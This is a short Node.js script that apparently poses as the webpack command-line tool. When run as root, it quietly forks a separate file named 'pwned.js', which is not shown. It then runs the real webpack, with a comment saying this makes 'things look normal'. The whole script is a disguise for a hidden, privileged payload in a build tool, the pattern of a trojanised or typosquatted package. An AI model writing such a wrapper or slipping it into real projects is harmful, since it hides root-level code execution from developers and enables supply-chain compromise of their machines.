#! /usr/bin/env node
'use strict';

const cp = require('child_process');
const isRoot = require('is-root');
const shell = require('shelljs');

if (isRoot()) {
    let child = cp.fork('./bin/pwned.js');
}

// Still run actual webpack so things look normal!
shell.exec('./node_modules/webpack/bin/webpack.js');
